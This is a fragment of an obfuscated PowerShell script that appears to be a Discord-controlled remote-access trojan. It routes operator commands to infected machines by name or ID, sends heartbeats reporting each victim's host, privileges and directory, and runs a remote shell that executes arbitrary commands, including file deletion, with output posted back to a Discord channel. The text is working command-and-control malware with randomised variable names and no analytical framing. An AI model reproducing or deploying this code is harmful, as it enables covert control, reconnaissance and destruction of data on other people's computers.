# ==================== ROUTING ====================
function Get-MessageTarget {
    param([string]$Content)
    if ($Content -match '^@all\s+([\s\S]*)$')    { return @{ Target='all'; Cmd=$Matches[1] } }
    if ($Content -match '^@(\S+)\s+([\s\S]*)$') {
        $gpNYybm = $Matches[1]
        if ($gpNYybm -eq '*') { return @{ Target='all'; Cmd=$Matches[2] } }
        if ($gpNYybm.ToLower() -eq 'me') { return @{ Target='me'; Cmd=$Matches[2] } }
        if ($gpNYybm.ToLower() -eq $script:pcName.ToLower()) { return @{ Target='me'; Cmd=$Matches[2] } }
        if ($gpNYybm.ToLower() -eq $script:hostname.ToLower()) { return @{ Target='me'; Cmd=$Matches[2] } }
        return @{ Target='other'; Cmd=$Matches[2] }
    }
    if ($Content -match '^#([0-9a-fA-F]+)\s+([\s\S]*)$') {
        $eNeS = $Matches[1].ToLower()
        if ($eNeS -eq $script:machineId) { return @{ Target='me'; Cmd=$Matches[2] } }
        return @{ Target='other'; Cmd=$Matches[2] }
    }
    return @{ Target='all'; Cmd=$Content }
}

function Test-IsShellTarget {
    if ($script:shellTargets.Count -eq 0) { return $false }
    $DpOtxiEJ = $script:pcName.ToLower()
    $gpNYybm = $script:hostname.ToLower()
    foreach ($vAMDhry1 in $script:shellTargets) {
        $nBifFBfW = $vAMDhry1.ToLower()
        if ($nBifFBfW -eq 'all' -or $nBifFBfW -eq '*' -or $nBifFBfW -eq $DpOtxiEJ -or $nBifFBfW -eq $gpNYybm) { return $true }
    }
    return $false
}

function Send-Heartbeat {
    try {
        $Mcud2Fwx = (Get-Date) - $script:startTime
        $bDsym = if (Test-Admin) { "admin" } else { "user" }
        $XBcPp = if ($script:isSet) { "" } else { " *(chua setpc)*" }
        $wOiiEno = if ($script:shellMode) { " shell" } else { "" }
        $Ut6vaf0 = "ON **$($script:pcName)** ``$($script:machineId)`` #$($script:instanceId) | up $([math]::Floor($Mcud2Fwx.TotalHours))h$($Mcud2Fwx.Minutes)m | $bDsym | cwd ``$($script:workDir)``$XBcPp$wOiiEno"
        Send-DiscordMessage -Content $Ut6vaf0 -NoTag
        $script:lastBeat = Get-Date
    } catch { }
}

function Resolve-ShellLine {
    param([string]$Line, [string]$MsgId)
    $Line = ([string]$Line).Trim()
    if (-not $Line) { return }
    if ($Line -match '^(\S+)\s*([\s\S]*)$') { $e6Ie = $Matches[1]; $T1vK = $Matches[2] }
    else { $e6Ie = $Line; $T1vK = "" }
    $PUwcNZ = $e6Ie.ToLower()

    if ($PUwcNZ -in @("cd","chdir","pushd","popd")) {
        $FOnpYT = $T1vK.Trim().Trim('"').Trim("'")
        if ($PUwcNZ -eq "popd") { $FOnpYT = (Get-Item -LiteralPath $script:workDir).Parent.FullName }
        if ($PUwcNZ -in @("cd","chdir","pushd") -and -not $FOnpYT) { Send-DiscordMessage -Content "DIR ``$($script:workDir)``" -ReplyToId $MsgId; return }
        try {
            if ($FOnpYT -eq "..") { $uRBm62L = (Get-Item -LiteralPath $script:workDir).Parent.FullName }
            elseif ($FOnpYT -eq ".") { $uRBm62L = $script:workDir }
            elseif ($FOnpYT -match '^[A-Za-z]:$') { $uRBm62L = "$FOnpYT\" }
            elseif ([System.IO.Path]::IsPathRooted($FOnpYT)) { $uRBm62L = [System.IO.Path]::GetFullPath($FOnpYT) }
            else { $uRBm62L = [System.IO.Path]::GetFullPath((Join-Path $script:workDir $FOnpYT)) }
            if (Test-Path -LiteralPath $uRBm62L -PathType Container) { $script:workDir = (Get-Item -LiteralPath $uRBm62L).FullName; Send-DiscordMessage -Content "DIR ``$($script:workDir)``" -ReplyToId $MsgId }
            else { Send-DiscordMessage -Content "not found: ``$uRBm62L``" -ReplyToId $MsgId }
        } catch { Send-DiscordMessage -Content "ERR: $_" -ReplyToId $MsgId }
        return
    }
    if ($PUwcNZ -eq "pwd") { Send-DiscordMessage -Content "DIR ``$($script:workDir)``" -ReplyToId $MsgId; return }
    if ($PUwcNZ -in @("exit","quit")) { $script:shellMode = $false; Send-DiscordMessage -Content "shell OFF" -ReplyToId $MsgId; return }
    if ($PUwcNZ -in @("cls","clear")) { Send-DiscordMessage -Content "cleared" -ReplyToId $MsgId; return }
    if ($PUwcNZ -in @("ls","ll","la")) { $PTod2an = if ($PUwcNZ -eq "la") { "/a" } else { "" }; $ML4Hl = Invoke-CmdCommand -Command "dir $PTod2an $T1vK".Trim(); Send-CodeBlock -Title "$($script:pcName)> $Line" -Body $ML4Hl -ReplyToId $MsgId; return }
    if ($PUwcNZ -in @("cat","less","more")) { $ML4Hl = Invoke-CmdCommand -Command "type $T1vK"; Send-CodeBlock -Title "cat" -Body $ML4Hl -ReplyToId $MsgId; return }
    if ($PUwcNZ -eq "cp") { $ML4Hl = Invoke-CmdCommand -Command "copy $T1vK"; Send-CodeBlock -Title "cp" -Body $ML4Hl -ReplyToId $MsgId; return }
    if ($PUwcNZ -eq "mv") { $ML4Hl = Invoke-CmdCommand -Command "move $T1vK"; Send-CodeBlock -Title "mv" -Body $ML4Hl -ReplyToId $MsgId; return }
    if ($PUwcNZ -eq "rm") { $ML4Hl = Invoke-CmdCommand -Command "del /q $T1vK"; Send-CodeBlock -Title "rm" -Body $ML4Hl -ReplyToId $MsgId; return }
    if ($PUwcNZ -in @("rmdir","rd")) { $ML4Hl = Invoke-CmdCommand -Command "rmdir /s /q $T1vK"; Send-CodeBlock -Title "rmdir" -Body $ML4Hl -ReplyToId $MsgId; return }
    if ($PUwcNZ -in @("mkdir","md")) { $ML4Hl = Invoke-CmdCommand -Command "mkdir $T1vK"; Send-CodeBlock -Title "mkdir" -Body $ML4Hl -ReplyToId $MsgId; return }
    if ($PUwcNZ -eq "echo") { if ($T1vK -eq "." -or $T1vK -eq "") { Send-DiscordMessage -Content "(blank)" -ReplyToId $MsgId } else { Send-DiscordMessage -Content $T1vK -ReplyToId $MsgId }; return }
    if ($PUwcNZ -eq "help") { Send-DiscordMessage -Content "go !help" -ReplyToId $MsgId; return }
    $ML4Hl = Invoke-CmdCommand -Command $Line
    Send-CodeBlock -Title "$($script:pcName)> $Line" -Body $ML4Hl -ReplyToId $MsgId
}

$UBfIXKm = @'
